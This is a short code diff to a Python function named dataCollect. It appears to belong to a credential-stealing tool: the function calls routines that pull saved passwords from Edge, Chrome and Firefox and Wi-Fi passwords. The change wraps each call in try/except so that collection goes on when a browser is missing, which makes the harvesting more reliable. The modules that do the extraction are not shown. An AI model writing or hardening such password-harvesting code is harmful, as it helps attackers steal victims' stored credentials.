@@ -19,10 +19,26 @@ def dataCollect():
 
         set = begining.get("data")
 
-        edge.get_password(set)
-        firefox.password(set)
-        chrome.password(set)
-        wifi.password(set)
+        try:
+            edge.get_password(set)
+        except:
+            print("No edge")
+
+        try:
+            chrome.password(set)
+        except:
+            print("No Chrome")
+
+        try:
+            firefox.password(set)
+        except:
+            print("No Firefox")
+
+        try:
+            wifi.password(set)
+        except:
+            print("No wifi")
+
     except:
         begining = {}
 
